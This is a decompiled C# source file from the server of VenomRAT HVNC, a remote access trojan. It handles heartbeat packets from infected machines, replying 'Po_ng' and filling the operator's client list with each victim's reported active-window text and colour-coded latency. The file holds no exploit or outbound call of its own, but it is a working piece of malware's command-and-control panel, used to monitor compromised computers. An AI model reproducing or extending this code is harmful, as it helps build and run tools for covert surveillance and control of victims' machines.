using System.Drawing;
using System.Threading;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Handle_Packet
{
    // Token: 0x020000AE RID: 174
    public class HandlePing
    {
        // Token: 0x060005C0 RID: 1472 RVA: 0x00045700 File Offset: 0x00045700
        public void Ping(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").SetAsString("Po_ng");
                ThreadPool.QueueUserWorkItem(new WaitCallback(client.Send), msgPack.Encode2Bytes());
                object lockListviewClients = Settings.LockListviewClients;
                lock (lockListviewClients)
                {
                    if (client.LV != null)
                    {
                        client.LV.SubItems[Program.form1.lv_act.Index].Text = unpack_msgpack.ForcePathObject("Message").AsString;
                    }
                }
            }
            catch
            {
            }
        }

        // Token: 0x060005C1 RID: 1473 RVA: 0x000457BC File Offset: 0x000457BC
        public void Po_ng(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                object lockListviewClients = Settings.LockListviewClients;
                lock (lockListviewClients)
                {
                    if (client.LV != null)
                    {
                        client.LV.SubItems[Program.form1.lv_ping.Index].Text = unpack_msgpack.ForcePathObject("Message").AsInteger.ToString() + " MS";
                        if (unpack_msgpack.ForcePathObject("Message").AsInteger > 600L)
                        {
                            client.LV.SubItems[Program.form1.lv_ping.Index].ForeColor = Color.Red;
                        }
                        else if (unpack_msgpack.ForcePathObject("Message").AsInteger > 300L)
                        {
                            client.LV.SubItems[Program.form1.lv_ping.Index].ForeColor = Color.Orange;
                        }
                        else
                        {
                            client.LV.SubItems[Program.form1.lv_ping.Index].ForeColor = Color.Green;
                        }
                    }
                }
            }
            catch
            {
            }
        }
    }
}